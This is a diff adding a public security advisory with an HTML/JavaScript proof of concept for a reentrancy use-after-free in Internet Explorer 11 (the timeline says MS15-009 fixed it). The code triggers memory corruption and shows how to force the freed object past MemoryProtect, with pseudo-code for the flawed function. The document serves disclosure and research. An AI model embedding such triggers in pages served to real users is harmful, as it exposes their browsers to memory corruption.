@@ -1,0 +1,165 @@
+<!--
+Source: http://blog.skylined.nl/20161114001.html
+
+Synopsis
+
+A specially crafted web-page can cause MSIE 11 to interrupt the handling of one readystatechange event with another. This interrupts a call to one of the various C<Element­Name>Element::Notify functions to make another such call and at least one of these functions is non-reentrant. This can have various repercussions, e.g. when an attacker triggers this vulnerability using a CMap­Element object, a reference to that object can be stored in a linked list and the object itself can be freed. This pointer can later be re-used to cause a classic use-after-free issue.
+
+Known affected versions, attack vectors and mitigations
+
+Microsoft Internet Explorer 11
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Java­Script should prevent an attacker from triggering the vulnerable code path.
+
+Description
+
+When a Document­Fragment containing an applet element is added to the DOM, all elements receive a notification that they are removed from the CMarkup. Next, they are added to the DOM and receive notification of being added to another CMarkup. When the applet is added, a CObject­Element is created and added to the CMarkup. This causes a readystatechange event to fire, which interrupts the current code. During this readystatechange event, the DOM may be modified, which causes further notifications to fire. However, elements in the Document­Fragment that come after the applet element have already received a notification that they have been remove from one CMarkup, but not that they have been added to the new one. Thus, these elements may receive another notification of removal, followed by two notifications of being added to a CMarkup.
+-->
+
+<?xml version="1.0"?>
+<!DOCTYPE x PUBLIC "x" "x">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <script type="text/javascript">
+    <![CDATA[
+      // This Po­C attempts to exploit a renetrancy issue in Microsoft Internet
+      // Explorer to trigger a use-after-free.
+      // See http://blog.skylined.nl/20161114001.html for details.
+      var o­Doc­Elem = document.document­Element;
+      var o­Container, o­Map1, o­Map2, u­Event­Counter = 0;
+      // A C CMarkup object can have a pointer to a C CDoc object. This C
+      // CDoc object has a singly linked list of CMap­Elements added to the
+      // DOM, starting at offset 8 (See MSHTML!CMarkup::Get­Map­Head) of the CDoc
+      // and continuing through offset 38 of the CMap­Element.
+      // CDoc[8] -> CMap­Element[38]#1 -> CMap­Element[38]#2 -> etc... -> NULL
+      // When CMap­Element::Notify is called to add a Map element to the DOM,
+      // code 0x17, the CMap­Element is inserted at the start of this list.
+      // When CMap­Element::Notify is called to remove a Map element from the
+      // DOM, code 0x18, the linked list is followed to find the CMap­Element and
+      // remove if from the list when found.
+      // When CMap­Element::Notify is called twice to add the same element to the
+      // DOM, a loop is created, rather than the CMap­Element ending up in the
+      // list twice.
+      // When CMap­Element::Notify is called twice to remove the same element
+      // from the DOM, nothing happens the second time.
+      function on­Ready­State­Change­Callback(){
+        var u­Event­Id = ++u­Event­Counter;
+        if (u­Event­Id == 1) {
+          // Create a "container" DOM element with three children:
+          // map, applet, map.
+          o­Container = document.create­Element("o­Container");
+          o­Map1 = o­Container.append­Child(document.create­Element("map"));
+          o­Container.append­Child(document.create­Element("applet"));
+          o­Map2 = o­Container.append­Child(document.create­Element("map"));
+          // Add the container DOM element to the DOM document. While adding the
+          // applet DOM object to the DOM document a new C "CObject­Element" is
+          // created and added to the C CMarkup (which is roughly the equivalent
+          // of a DOM Document­Fragment AFAICT). This triggers a new
+          // readystatechange event that interrupts the current one.
+          o­Doc­Elem.append­Child(o­Container);
+          // The interrupting readystatechange event is fired after the o­Map2
+          // C CMap­Element::Notify method has been call to notify that the
+          // object is being removed from one Document­Fragement, but before it
+          // is notified that it is being added to another.
+          // List#1 -> CMap­Element#1 -> NULL
+        } else if (u­Event­Id == 2) {
+          o­Container.remove­Node(true);
+          // Removing the container from the document causes another round of
+          // calls to ::Notify for remove and add. The last call to o­Map2 was
+          // to inform it that it was removed from a C CMarkup. It is now
+          // getting another such call. This is unexpected, but the code does
+          // not detect it. Next, it is added to a new list.
+          // List#2 -> NULL
+          // List#2 -> CMap­Element#2 -> CMap­Element#1 -> NULL
+        }
+        if (u­Event­Id == 1) {
+          // Now, the delayed C CMap­Element::Notify method to add the object
+          // to the DOM is called. The CMap­Element is added to the same list
+          // again, causing a loop.
+          // List#2 -> CMap­Element#2 -> CMap­Element#2 -> loop.
+          // Finally, we remove the CMap­Element from the DOM and destroy all
+          // references we have to it. This causes another round of calls to
+          // ::Notify for remove and add, only the remove is important, as
+          // it fails to remove the CMap­Element from the list because it
+          // contains a loop.
+          o­Map2.remove­Node();
+          o­Map2 = null;
+          // List#2 -> CMap­Element#2 -> CMap­Element#2 -> loop.
+          // As far as MSIE is concerned, all references to o­Map2 have now been
+          // destroyed, and the element is allowed to get freed. We need to
+          // trick the new Memory­Protect code into actually releasing it. For
+          // this, we need to interrupt Java­Script execution first, which is
+          // done by setting a timeout.
+          set­Timeout(function () {
+            // Now the Memory­Protect code will allow the CMap­Element to be
+            // freed. However, it only does so when enough memory has been
+            // scheduled to be freed (100000 bytes). This can easily be forced
+            // by creating and discarding a bunch of element. The video element
+            // causes MSIE to allocate 0x190 bytes of memory.
+            var u­Elements­Count = Math.ceil(100000 / 0x190);
+            for (var i = 0; i < u­Elements­Count; i++) {
+              document.create­Element("video");
+              Collect­Garbage();
+            }
+            // Now the CMap­Element is finally freed.
+            // The list originally contained a reference to CMap­Element#1.
+            // When the code tries to remove this, it will follow the linked
+            // list and access the freed CMap­Element#2 memory.
+            o­Map1.remove­Node();
+            alert("FAIL");
+          }, 0);
+        }
+      }
+      document.add­Event­Listener("readystatechange", on­Ready­State­Change­Callback, false);
+      // This work by Sky­Lined is licensed under a Creative Commons
+      // Attribution-Non-Commercial 4.0 International License. 
+    ]]>
+  </script>
+</html>
+
+<!--
+AFAICT, this event-within-an-event itself is the root cause of the bug and allows memory corruption in various ways. I discovered the issue because the code in CMap­Element::Notify does not handle this sequence of events well. The below pseudo-code represents that function and shows how this can lead to memory corruption:
+
+void MSHTML!CMap­Element::Notify(CNotification* p­Notification) {
+  CElement::Notify(p­Arg1);
+
+  if (p­Notification->dw­Code_00 == 17) { // add
+    CMarkup* p­Markup = this->CElement::Get­Markup();
+    this->p­Next­Map­Element_38 = p­Markup->Get­Map­Head();
+    p­Markup->CMarkup::Set­Map­Head(this);
+  } else if (p­Notification->dw­Code_00 == 18) { // remove
+    CMarkup* p­Markup = this->CElement::Get­Markup();
+    CDoc p­Doc = p­Markup->CMarkup::Get­Lookaside­Ptr(4);
+    CMap­Element** pp­Map­Element = &(p­Doc->p­Map­Element_08);
+    while(*pp­Map­Element) {
+      if (*pp­Map­Element == this) {
+        *pp­Map­Element = this->p­Map­Element_38;
+        break;
+      }
+      pp­Map­Element = &(*pp­Map­Element->p­Map­Element_38);
+    }
+  }
+}
+
+This code maintains a singly linked list of map elements that have been added to the document. An object should never be added to this list twice, as this will cause a loop in the list (a map element pointing to itself as the next in the list). However, the event-within-an-event can be used to first cause two consecutive calls to remove the same element from this list followed by two calls to add the same element to the list. This results in the following sequence of events:
+
+The first call to remove the element will remove it from the list.
+The second call to remove the element will do nothing.
+The first call to add the element will add it to the list.
+The second call to add the element will try to add it to the list again, causing the list to contain a loop. This list is now corrupt.
+
+At this point, an attacker can remove the CMap­Element, causing the code to try to remove it from the list and free it. However, because of the loop in the list, the above code will not actually remove it from the list. After this, the pointer in the list points to freed memory.
+
+Exploit
+
+I focused on the CMap­Element::Notify code and was able to reuse the freed memory originally used for the CMap­Element with another object of similar size (eg. a CParam­Element, which may be extra useful as it will store a pointer to its parent CObject­Element at offset 38). However, I could not think of a way to use the CMap­Element::Notify code to do anything useful at that point. I could also not immediately find any other code that uses this linked list, which is a bit odd: why would MSIE keep a linked list and not use it? I suspect there must be other code that uses it, and that this code may allow exploitation of this vulnerability.
+
+Aside from the use-after-free bug that exists for CMap­Element objects above, there may be many other issues for other types of objects, as there are many different C<Elenent­Name>Element::Notify implementations for the various elements. It is assumes that none of these were designed to be reentrant. Unfortunately, I did not have time to exhaustively reverse engineer their code to look for other code paths that might be exploitable. As a result I am unable to prove exploitability beyond reasonable doubt.
+
+Time-line
+
+September 2014: This vulnerability was found through fuzzing.
+September 2014: This vulnerability was submitted to ZDI.
+September 2014: This vulnerability was acquired by ZDI.
+February 2015: Microsoft address this issue in MS15-009.
+November 2016: Details of this issue are released.
+-->
